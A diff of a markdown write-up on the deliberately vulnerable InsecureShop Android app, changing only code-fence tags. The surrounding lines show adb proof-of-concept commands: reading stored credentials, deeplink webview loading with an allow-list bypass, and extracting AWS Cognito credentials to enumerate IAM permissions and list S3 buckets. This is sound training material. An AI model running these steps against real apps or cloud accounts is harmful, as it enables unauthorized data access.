@@ -107,7 +107,7 @@ The previous sections should be enough to prepare you for the following ones. To
 
 We should also install the application into our testing device. If you're using an emulator, you can simply drag and drop the application into it. If you're using a physical device, connect it into your machine through a usb cable then execute the following commands (this also works for emulators btw):
 
-```shell=
+```shell
 # make sure that adb detects your device
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb devices
 * daemon not running; starting now at tcp:5037
@@ -130,7 +130,7 @@ It asks for credentials which we weren't provided with, from this point we will 
 The first point of analysis when reverse engineering android apps is to explore the contents of the android manifest. The Android Manifest is an XML file which contains important metadata about the Android app. This includes the package name, activity names, main activity (the entry point to the app), Android version support, hardware features support, permissions, and other configurations.
 
 Here's the manifest for InsecureShop.apk:
-```xml=
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android" android:versionCode="1" android:versionName="1.0" android:compileSdkVersion="29" android:compileSdkVersionCodename="10" package="com.insecureshop" platformBuildVersionCode="29" platformBuildVersionName="10">
     <uses-sdk android:minSdkVersion="16" android:targetSdkVersion="29"/>
@@ -248,7 +248,7 @@ The vulnerability here is that credentials are hardcoded into the `getUserCreds`
 ## Vulnerability #3: Insecure Data Storage
 If we go back to `com.insecureshop.LoginActivity` and analyze the code that follows after we successfully login (check lines 44-70), we see that the following code saves the username and password values into the app's shared preferences.
 
-```kotlin=
+```kotlin
 Prefs prefs = Prefs.INSTANCE;
 Context applicationContext = getApplicationContext();
 Intrinsics.checkExpressionValueIsNotNull(applicationContext, "applicationContext");
@@ -265,7 +265,7 @@ return;
 
 proof-of-concept: since the app is debuggable, we can `run-as` the application in order to view the contents of its internal storage:
 
-```shell=
+```shell
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell
 2026:/ $ run-as com.insecureshop
 2026:/data/user/0/com.insecureshop $ ls -la
@@ -311,7 +311,7 @@ For the proof-of-concept, we can simply try to intercept HTTPS requests even wit
 
 One thing that might concern readers is that `com.insecureshop.WebViewActivity` isn't really explicitly used anywhere in the application, even after reading every line of the source code. True, but when we check the manifest entry for the application we see that it defines a [deeplink](https://developer.android.com/training/app-links/deep-linking):
 
-```xml=
+```xml
 <activity android:name="com.insecureshop.WebViewActivity">
     <intent-filter>
         <action android:name="android.intent.action.VIEW"/>
@@ -328,7 +328,7 @@ POC Steps:
 1. Make sure that you don't have a valid, working certificate installed on your device. 
 2. Use the following guide to configure burp + your device's wifi proxy settings **BUT DO NOT INSTALL THE BURP CERTIFICATE**: https://portswigger.net/support/configuring-an-android-device-to-work-with-burp
 3. Fire up the following adb command which should open `google.com` on the vulnerable webview:
-```shell=
+```shell
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d insecureshop://com.insecureshop/web?url=https://google.com
 Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=insecureshop://com.insecureshop/web?url=https://google.com }
 ```
@@ -353,7 +353,7 @@ Now let's focus on the else if block when the path supplied in a deeplink is `/w
 
 However, there is an additional step to check if the url we retrieved endswith the string `insecureshopapp.com`. This may be a mechanism implemented by developers to only allow opening urls that they own. However, this is vulnerable since we can easily bypass the check:
 
-```shell=
+```shell
 C:\Users\Pc\Downloads\InsecureShop-Writeup>adb shell am start -a android.intent.action.VIEW -c android.intent.category.BROWSABLE -d insecureshop://com.insecureshop/webview?url=https://google.com/?ignore=insecureshopapp.com
 Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.BROWSABLE] dat=insecureshop://com.insecureshop/webview?url=https://google.com/?ignore=insecureshopapp.com }
 ```
@@ -361,7 +361,7 @@ Starting: Intent { act=android.intent.action.VIEW cat=[android.intent.category.B
 ## Vulnerability #7: AWS Cognito Misconfiguration
 
 It's not very incommon that android apps nowadays use cloud services - and not very uncommon either that developers sometimes hardcode potentially sensitive API keys into the resources of the app. While browsing through `strings.xml`, we found the following key:
-```xml=
+```xml
 <string name="aws_Identity_pool_ID">us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c</string>
 ```
 
@@ -371,7 +371,7 @@ After a bit of researching, I found out the following documentation for [AWS Cog
 
 Using the mentioned keyhacks repo, I tried to read the part regarding AWS and tried to install awscli using the following command:
 
-```shell=
+```shell
 sudo apt-get install awscli
 ```
 
@@ -379,7 +379,7 @@ To test this vulnerability, I followed used the following writeup as a reference
 
 First step that we need to do is to extract AWS credentials (access_key, secret_key, session_token) from the identity-pool:
 
-```shell=
+```shell
 aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-42af-4717-8689-00a9a4b65c1c --region us-east-1 
 aws cognito-identity get-credentials-for-identity --identity-id <identity-id-from-previous-command> --region us-east-1
 ```
@@ -388,7 +388,7 @@ aws cognito-identity get-credentials-for-identity --identity-id <identity-id-fro
 
 Afterwhich, we'll use the following script (https://github.com/andresriancho/enumerate-iam) to enumerate permissions with the credentials that we have.
 
-```shell=
+```shell
 python3 enumerate-iam.py --access-key <ACCESS-KEY-ID> --secret-key <SECRET-KEY-ID> --session-token <SESSION-TOKEN-VALUE>
 ```
 
@@ -400,7 +400,7 @@ An interesting permission that we have is that we can list the s3 buckets. For i
 
 We see two buckets, now let's see what they contain:
 
-```shell=
+```shell
 ┌──(ctfvm㉿ctfvm)-[~/Desktop/test/enumerate-iam]
 └─$ aws s3 ls                                                                                                                        
 2020-11-15 12:31:10 elasticbeanstalk-us-west-2-094222047775
